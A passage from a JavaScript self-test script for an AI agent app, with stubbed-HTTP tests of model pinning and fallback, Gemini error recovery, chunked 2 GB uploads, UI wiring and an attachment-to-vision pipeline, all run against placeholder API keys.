    process.env.OPENROUTER_API_KEY = "sk-or-v1-selftest-not-real";
    global.fetch = async (url, init) => {
      calls.push({ url: String(url), body: JSON.parse(init.body) });
      return sseResponse("deepseek/deepseek-chat", "pinned-ok");
    };
    try {
      const r = await openrouter.completeStream({
        messages: [{ role: "user", content: "hi" }],
        models: ["deepseek/deepseek-chat"],
        pinned: true,
        onDelta: () => {},
      });
      assert(calls.length === 1, `expected exactly one HTTP call, saw ${calls.length}`);
      const body = calls[0].body;
      assert(body.model === "deepseek/deepseek-chat", `body.model is ${body.model}`);
      assert(!Array.isArray(body.models), `a pinned request must not carry a models array, got ${JSON.stringify(body.models)}`);
      assert(/deepseek/.test(r.model), `answered model was ${r.model}`);
      return `one call · model=${body.model} · answered=${r.model}`;
    } finally {
      global.fetch = realFetch;
      delete process.env.OPENROUTER_API_KEY;
    }
  });

  await checkAsync("pinned: a dead slug fails LOUDLY instead of silently answering from gpt-4.1-mini", async () => {
    const realFetch = global.fetch;
    const attempted = [];
    process.env.OPENROUTER_API_KEY = "sk-or-v1-selftest-not-real";
    global.fetch = async (url, init) => {
      const body = JSON.parse(init.body);
      attempted.push(body.model || (body.models || []).join("+"));
      return new Response(JSON.stringify({ error: { message: `No allowed providers are available for ${body.model}` } }), {
        status: 404,
      });
    };
    try {
      let threw = "";
      try {
        await openrouter.completeStream({
          messages: [{ role: "user", content: "hi" }],
          models: ["meta-llama/llama-3.3-70b-instruct:free"],
          pinned: true,
          onDelta: () => {},
        });
      } catch (err) {
        threw = err.message;
      }
      assert(threw.includes("could not complete"), `expected a loud failure, got: ${threw.slice(0, 120)}`);
      assert(
        attempted.length > 0 && attempted.every((m) => m === "meta-llama/llama-3.3-70b-instruct:free"),
        `the pinned slug must be the only one tried, saw: ${attempted.join(", ") || "none"}`,
      );
      return `failed loudly after ${attempted.length} same-slug attempt(s); never touched the Auto chain`;
    } finally {
      global.fetch = realFetch;
      delete process.env.OPENROUTER_API_KEY;
    }
  });

  await checkAsync("pinned: a tools rejection retries the SAME model without tools", async () => {
    const realFetch = global.fetch;
    const seen = [];
    process.env.OPENROUTER_API_KEY = "sk-or-v1-selftest-not-real";
    global.fetch = async (url, init) => {
      const body = JSON.parse(init.body);
      seen.push({ model: body.model, hasTools: Array.isArray(body.tools) });
      if (body.tools) {
        return new Response(JSON.stringify({ error: { message: "This model does not support tool calling" } }), {
          status: 400,
        });
      }
      return sseResponse(body.model, "tools-free-ok");
    };
    try {
      const r = await openrouter.completeStream({
        messages: [{ role: "user", content: "hi" }],
        models: ["deepseek/deepseek-r1"],
        pinned: true,
        tools: [{ type: "function", function: { name: "t", description: "d", parameters: {} } }],
        onDelta: () => {},
      });
      assert(seen.length === 2, `expected tools then no-tools on the same slug, saw ${seen.length}`);
      assert(seen.every((s) => s.model === "deepseek/deepseek-r1"), "a different slug was tried");
      assert(seen[0].hasTools && !seen[1].hasTools, "the retry did not drop tools");
      assert(/tools-free-ok/.test(r.text), r.text);
      return "same slug retried tool-free and answered";
    } finally {
      global.fetch = realFetch;
      delete process.env.OPENROUTER_API_KEY;
    }
  });

  await checkAsync("gemini: thinking starvation (MAX_TOKENS, no text) recovers instead of 'key not working'", async () => {
    const realFetch = global.fetch;
    process.env.GEMINI_API_KEY = "AIza-testkey-not-real-000000";
    const bodies = [];
    let call = 0;
    global.fetch = async (url, init) => {
      call += 1;
      bodies.push({ url: String(url), body: JSON.parse(init.body), keyHeader: init.headers["x-goog-api-key"] });
      if (call === 1) {
        // The exact old failure: a 2.5 thinking model burns the whole budget
        // on hidden reasoning and returns NO text with finishReason MAX_TOKENS.
        return new Response(
          JSON.stringify({
            candidates: [{ content: { parts: [{ thought: true, text: "internal reasoning…" }] }, finishReason: "MAX_TOKENS" }],
          }),
          { status: 200 },
        );
      }
      return new Response(
        JSON.stringify({ candidates: [{ content: { parts: [{ text: "GEMINI_OK" }] }, finishReason: "STOP" }] }),
        { status: 200 },
      );
    };
    try {
      const r = await gemini.geminiComplete({
        messages: [{ role: "user", content: "Reply with exactly GEMINI_OK" }],
        maxTokens: 512,
      });
      assert(r.text === "GEMINI_OK", `got ${r.text}`);
      const first = bodies[0].body;
      assert(
        first.generationConfig && first.generationConfig.thinkingConfig && first.generationConfig.thinkingConfig.thinkingBudget === 0,
        "the first attempt must disable thinking so it cannot starve the output",
      );
      assert(first.generationConfig.maxOutputTokens >= 2048, "token budget too small for a thinking model");
      assert(bodies[0].keyHeader === process.env.GEMINI_API_KEY, "key not sent via x-goog-api-key");
      return `recovered after ${call} call(s); thinkingBudget:0 sent; answered by ${r.model}`;
    } finally {
      global.fetch = realFetch;
      delete process.env.GEMINI_API_KEY;
    }
  });

  await checkAsync("gemini: a bad key is a clear auth error, not a mystery failure", async () => {
    const realFetch = global.fetch;
    process.env.GEMINI_API_KEY = "AIza-testkey-not-real-000001";
    global.fetch = async () =>
      new Response(JSON.stringify({ error: { message: "API key not valid. Please pass a valid API key." } }), {
        status: 403,
      });
    try {
      let msg = "";
      try {
        await gemini.geminiComplete({ messages: [{ role: "user", content: "hi" }] });
      } catch (err) {
        msg = err.message;
      }
      assert(/rejected the API key/.test(msg), `message was: ${msg.slice(0, 120)}`);
      return "auth failure names the key";
    } finally {
      global.fetch = realFetch;
      delete process.env.GEMINI_API_KEY;
    }
  });

  /* ------------------------- 2 GB workspace uploads ------------------------ */

  await checkAsync("uploads: chunked init → append → complete round trip, capped at 2 GB", async () => {
    const tooBig = await uploads.initUpload({ name: "huge.bin", size: 3 * 1024 ** 3 }).then(
      () => null,
      (err) => err.message,
    );
    assert(tooBig && /2 GB/.test(tooBig), `oversize guard failed: ${tooBig}`);

    const payload = "region,cases\nAccra,12\nAsh,18\n"; // 29 bytes
    const { uploadId } = await uploads.initUpload({ name: "selftest.csv", size: Buffer.byteLength(payload), mime: "text/csv" });
    const mid = payload.slice(0, 22);
    await uploads.appendChunk(uploadId, Buffer.from(mid, "utf8"));
    await uploads.appendChunk(uploadId, Buffer.from(payload.slice(22), "utf8"));
    const { entry } = await uploads.completeUpload(uploadId);
    assert(entry.status === "complete" && entry.bytes === Buffer.byteLength(payload), `entry: ${JSON.stringify(entry)}`);

    const listed = await uploads.listUploads();
    assert(listed.some((u) => u.name === "selftest.csv" && u.bytes === Buffer.byteLength(payload)), "completed upload missing from listing");
    const head = await uploads.readUploadHead("selftest.csv");
    assert(head && head.text.startsWith("region,cases"), "head read failed");
    assert(head.truncated === false, "small file should not be truncated");

    const removed = await uploads.deleteUpload("selftest.csv");
    assert(removed, "delete failed");
    const after = await uploads.listUploads();
    assert(!after.some((u) => u.name === "selftest.csv"), "deleted upload still listed");
    return `${Buffer.byteLength(payload)}-byte file streamed in 2 chunks, listed, read back, deleted`;
  });

  /* --------------------------- UI wiring (source) -------------------------- */

  check("agent page: the sandbox is an in-flow panel, not a click-blocking overlay", () => {
    const page = fs.readFileSync(path.join(ROOT, "app/agent/page.tsx"), "utf8");
    assert(!/fixed inset-0 z-\[70\]/.test(page), "the old fixed overlay drawer is still there");
    assert(!/bg-ink\/25 backdrop-blur/.test(page), "the overlay backdrop is still there");
    assert(/order-last[\s\S]{0,120}lg:order-none/.test(page), "the sandbox panel is not part of the page flow");
    return "chat + workspace sit side by side in the flow; header always clickable";
  });

  check("agent page: every pinned slug the product promises is in the dropdown", () => {
    const page = fs.readFileSync(path.join(ROOT, "app/agent/page.tsx"), "utf8");
    const models = fs.readFileSync(path.join(ROOT, "lib/agent/models.ts"), "utf8");
    const expected = [
      "openai/gpt-4.1-mini",
      "google/gemini-2.5-flash",
      "openai/gpt-4o",
      "google/gemini-2.5-pro",
      "anthropic/claude-sonnet-4",
      "deepseek/deepseek-chat",
      "meta-llama/llama-3.3-70b-instruct:free",
    ];
    for (const slug of expected) assert(models.includes(slug), `${slug} missing from the catalogue`);
    assert(/PINNABLE_MODELS/.test(page), "the dropdown does not render from the catalogue");
    return `${expected.length} promised slugs present`;
  });

  check("deep research: Gemini synthesis is guarded, with a labelled OpenRouter fallback", () => {
    const src = fs.readFileSync(path.join(ROOT, "lib/agent/deep-research.ts"), "utf8");
    assert(/catch \(geminiErr\)/.test(src), "a Gemini failure would kill the whole research run");
    assert(/OpenRouter fallback/.test(src), "no labelled fallback engine");
    return "Gemini first, guarded; research survives an engine outage";
  });

  check("run: attachments ride through vision_read instead of blind inline parts", () => {
    const src = fs.readFileSync(path.join(ROOT, "lib/agent/run.ts"), "utf8");
    assert(/vision_read BEFORE answering/.test(src), "the model is not told to read attachments first");
    assert(!/image_url: \{ url: att\.dataUrl \}/.test(src), "base64 image parts are still inlined into chat turns");
    assert(/"vision_read"\]|\.\.\.input\.allowedTools, "vision_read"/.test(src), "vision_read is not force-enabled");
    return "every mode reads files through the Gemini vision tool";
  });

  check("workspace: 2 GB chunked upload endpoint and streaming download exist", () => {
    const lib = fs.readFileSync(path.join(ROOT, "lib/agent/uploads.ts"), "utf8");
    const upload = fs.readFileSync(path.join(ROOT, "app/api/agent/upload/route.ts"), "utf8");
    const download = fs.readFileSync(path.join(ROOT, "app/api/agent/download/route.ts"), "utf8");
    assert(/MAX_UPLOAD_BYTES = 2 \* 1024 \* 1024 \* 1024/.test(lib), "2 GB cap missing");
    assert(/action/.test(upload) && /PUT/.test(upload), "chunked protocol incomplete");
    assert(/createReadStream/.test(download) && /Content-Range/.test(download), "download does not stream with range support");
    const files = fs.readFileSync(path.join(ROOT, "app/api/agent/files/route.ts"), "utf8");
    assert(/listUploads/.test(files), "the Files panel does not merge uploads");
    return "init/PUT-chunk/complete + streaming range download + merged listing";
  });

  /* ------------------- the attachment → vision pipeline (live, stubbed HTTP) ------------------- */

  await checkAsync("vision pipeline: an attachment reaches the Gemini engine through the agent loop", async () => {
    const run = require(path.join(compiled, "agent/run.js"));
    const realFetch = global.fetch;
    process.env.OPENROUTER_API_KEY = "sk-or-v1-selftest-not-real";
    process.env.GEMINI_API_KEY = "AIza-testkey-not-real-000002";

    const b64 = Buffer.from("PNGDATA-of-a-field-photo", "utf8").toString("base64");
    const attachment = {
      name: "field-photo.png",
      mime: "image/png",
      dataUrl: `data:image/png;base64,${b64}`,
      kind: "image",
      bytes: 21,
    };

    const geminiBodies = [];
    let orToolCallSent = false;
    global.fetch = async (url, init) => {
      const target = String(url);
      const body = JSON.parse(init.body);
      if (target.includes("generativelanguage.googleapis.com")) {
        geminiBodies.push(body);
        return new Response(
          JSON.stringify({ candidates: [{ content: { parts: [{ text: "GEMINI_SAW_THE_IMAGE" }] }, finishReason: "STOP" }] }),
          { status: 200 },
        );
      }
      // OpenRouter
      if (body.stream) {
        if (!orToolCallSent) {
          orToolCallSent = true;
          const payload = [
            `data: ${JSON.stringify({
              model: "openai/gpt-4.1-mini",
              choices: [
                {
                  delta: {
                    tool_calls: [
                      {
                        index: 0,
                        id: "call_vision_1",
                        function: { name: "vision_read", arguments: JSON.stringify({ question: "What is in the attachment?" }) },
                      },
                    ],
                  },
                },
              ],
            })}`,
            "data: [DONE]",
          ].join("\n\n");
          return new Response(payload, { status: 200, headers: { "content-type": "text/event-stream" } });
        }
        const payload = [
          `data: ${JSON.stringify({ model: "openai/gpt-4.1-mini", choices: [{ delta: { content: "FINAL: GEMINI_SAW_THE_IMAGE" } }] })}`,
          "data: [DONE]",
        ].join("\n\n");
        return new Response(payload, { status: 200, headers: { "content-type": "text/event-stream" } });
      }
      // Background memory distillation (complete, non-stream).
      return new Response(JSON.stringify({ choices: [{ message: { content: '{"facts":[]}' } }] }), { status: 200 });
    };

    try {
      const events = [];
      const result = await run.runAgent({
        turns: [{ role: "user", content: "What is in my photo?", attachments: [attachment] }],
        mode: "vision",
        allowedTools: ["vision_read", "plan"],
        emit: (e) => events.push(e),
      });

      const visionCall = result.toolLog.find((t) => t.name === "vision_read");
      assert(visionCall && visionCall.ok, `vision_read did not run cleanly: ${JSON.stringify(result.toolLog)}`);
      assert(/GEMINI_SAW_THE_IMAGE/.test(result.text), `final answer missed the vision result: ${result.text.slice(0, 120)}`);
      assert(geminiBodies.length >= 1, "the Gemini engine was never called");
      const visionBody = JSON.stringify(geminiBodies[0]);
      assert(visionBody.includes("inlineData") || visionBody.includes("inline_data"), "no inline data part reached Gemini");
      assert(visionBody.includes(b64), "the attachment's bytes never reached Gemini - vision is blind");
      assert(visionBody.includes("image/png"), "mime type lost on the way to Gemini");
      return `photo → vision_read → Gemini inlineData → cited answer (${geminiBodies.length} Gemini call(s))`;
    } finally {
      global.fetch = realFetch;
      delete process.env.OPENROUTER_API_KEY;
      delete process.env.GEMINI_API_KEY;
    }
  });

  await checkAsync("vision pipeline: oversized text attachments ride to Gemini instead of vanishing", async () => {
    process.env.GEMINI_API_KEY = "AIza-testkey-not-real-000003";
    const realFetch = global.fetch;
    const geminiBodies = [];
    global.fetch = async (url, init) => {
      geminiBodies.push(JSON.parse(init.body));
      return new Response(
        JSON.stringify({ candidates: [{ content: { parts: [{ text: "CSV_READ_OK" }] }, finishReason: "STOP" }] }),
        { status: 200 },
      );
    };
    try {
      const csv = `district,cases\n${Array.from({ length: 1200 }, (_, i) => `D${i},${i % 50}`).join("\n")}`;
      const csvB64 = Buffer.from(csv, "utf8").toString("base64");
      const outcome = await tools.runTool(
        "vision_read",
        { question: "Which district has the most cases?" },
        {
          images: [],
          docs: [{ filename: "weekly.csv", file_data: `data:text/csv;base64,${csvB64}` }],
          attachmentNotes: ["weekly.csv"],
          mode: "vision",
        },
      );
      assert(outcome.ok, `vision_read failed: ${outcome.output.slice(0, 160)}`);
      assert(/CSV_READ_OK/.test(outcome.output), outcome.output.slice(0, 160));
      const sent = JSON.stringify(geminiBodies[0]);
      assert(sent.includes(csvB64.slice(0, 40)), "the CSV bytes never reached Gemini");
      assert(sent.includes("text/csv"), "CSV mime lost on the way to Gemini");
      return "5 KB+ CSV read by Gemini inline (was invisible before the fix)";
    } finally {
      global.fetch = realFetch;
      delete process.env.GEMINI_API_KEY;
    }
  });

  await checkAsync("vision pipeline: over-budget attachments are skipped loudly, never silently", async () => {
    process.env.GEMINI_API_KEY = "AIza-testkey-not-real-000004";
    const realFetch = global.fetch;
    global.fetch = async () =>
      new Response(JSON.stringify({ candidates: [{ content: { parts: [{ text: "VISION_OK" }] }, finishReason: "STOP" }] }), {
        status: 200,
      });
    try {
      const huge = "A".repeat(9_500_000);
      const outcome = await tools.runTool(
        "vision_read",
        { question: "Read these" },
        {
          images: [`data:image/png;base64,${huge}`, `data:image/png;base64,${huge}`],
          docs: [],
          attachmentNotes: ["big1.png", "big2.png"],
          mode: "vision",
        },
      );
      assert(outcome.ok, `expected a partial read, got: ${outcome.output.slice(0, 160)}`);
      assert(/exceeded the inline size budget and were NOT read/.test(outcome.output), "the skip was not announced");
      return "one image read, the other explicitly reported as skipped";
    } finally {
      global.fetch = realFetch;
      delete process.env.GEMINI_API_KEY;
    }
  });

  check("client: attachments ride along on sandbox resumes, and file events cannot crash the list", () => {
    const src = fs.readFileSync(path.join(ROOT, "components/agent/useAgent.ts"), "utf8");
    const resumeSends = (src.match(/attachments: turnAttachmentsRef\.current/g) || []).length;
    assert(resumeSends >= 2, `resume requests must carry the turn's attachments (found ${resumeSends})`);
    assert(/if \(parsed\.file && typeof \(parsed\.file as WorkspaceFile\)\.name === "string"\)/.test(src), "unguarded file event can push undefined into the file list");
    const route = fs.readFileSync(path.join(ROOT, "app/api/agent/route.ts"), "utf8");
    assert(/Array\.isArray\(body\.attachments\)/.test(route), "the API route still ignores top-level attachments - vision is blind");
    assert(/validAttachment/.test(route), "attachments are not validated/capped server-side");
    return "route merges + validates attachments; resume re-sends them; file events guarded";
  });

  console.log(failures ? `\n${failures} AGENT SELF-TEST(S) FAILED` : "\nALL AGENT SELF-TESTS PASSED");
  process.exit(failures ? 1 : 0);
})();
